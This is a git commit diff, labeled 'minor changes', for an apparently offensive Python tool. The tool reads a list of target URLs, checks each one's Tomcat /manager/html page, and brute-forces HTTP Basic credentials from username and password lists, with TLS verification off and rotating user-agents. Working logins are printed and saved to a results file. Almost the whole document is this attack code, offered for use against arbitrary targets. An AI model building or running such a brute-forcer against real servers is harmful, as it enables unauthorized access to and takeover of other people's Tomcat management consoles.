faf0bf41c6b3a4afac793d2c573409074f2eb079
knightm4re <knightmare.ninja>
2021-09-22 12:15:23 -0300

    fix: minor changes

--- main.py
+++ main.py
@@ -1,17 +1,16 @@
 #!/usr/bin/env python3
 
-from src.design.ui import banner, clear
+from src.interface.ui import banner
 from src.core.main import connect
 
 from argparse import ArgumentParser
 
 
 if __name__ == "__main__":
-    clear()
     banner()
 
     parser = ArgumentParser()
-    parser.add_argument('-l', help="Text file with targets to bruteforce", required=True)
+    parser.add_argument('-l', help="Specify the file containing the targets URLs", required=True)
     args = parser.parse_args()
 
     connect(args)
--- src/core/main.py
+++ src/core/main.py
@@ -1,18 +1,19 @@
 from requests import get
-from urllib3 import disable_warnings
 from rich import print
 from base64 import b64encode
+
+from urllib3 import disable_warnings
 disable_warnings()
 
 from src.core.manager import *
 
 
 def connect(args) -> str:
-    " Try to connect to the target "
+    """ Try to connect to the target """
 
     targets_file = args.l
-
     with open(targets_file, "r+") as file:
+
         content = file.readlines()
 
         for target in content:
@@ -21,12 +22,11 @@ def connect(args) -> str:
                 pass
 
             target = target.rstrip()
-
             path: str = f"{target}/manager/html"
 
             try:
-                response         = get(path, **props)
-                body: str        = response.text
+                response = get(path, **props)
+                body: str = response.text
                 status_code: str = response.status_code
 
                 detect = lambda success = 401 or 200: status_code == success and 'Tomcat' or 'tomcat' in body
@@ -46,27 +46,24 @@ def bruteforce(path) -> str:
 
     for u, p in zip(get_usernames(), get_passwords()):
 
-        auth_string: str  = u+p
-        auth_string: str  = auth_string.encode('utf-8')
-        auth_string: str  = b64encode(auth_string)
-        auth_string: str  = f'Basic {auth_string}'
+        auth_string: str = u+p
+        auth_string: str = auth_string.encode('utf-8')
+        auth_string: str = b64encode(auth_string)
+        auth_string: str = f'Basic {auth_string}'
 
-        chars: str        = "b'"
-        auth_string: str  = auth_string.replace(chars, "")
-        auth_string: str  = auth_string.replace("'", "")
+        chars: str = "b'"
+        auth_string: str = auth_string.replace(chars, "")
+        auth_string: str = auth_string.replace("'", "")
 
-        auth_header: str  = { 'Authorization': auth_string, 'User-Agent': user_agent() }
+        auth_header: str = { 'Authorization': auth_string, 'User-Agent': user_agent() }
 
-        response          = get(path, verify=False, headers=auth_header)
-        status_code: str  = response.status_code
+        response = get(path, verify=False, headers=auth_header)
+        status_code: str = response.status_code
 
-        if(status_code == 200):
+        if (status_code == 200):
             print(f"[green][*] Login: {u+p} | URL: {path} | Cookie: {auth_string}\n [/]")
 
             with open("src/core/result/out.txt", "a+") as file:
                 file.write(f"{path} | {u+p} | {auth_string}")
-
-        else:
-            pass
 
     print(f"[cyan][*] Bruteforce on {path} is done.\n [/]")
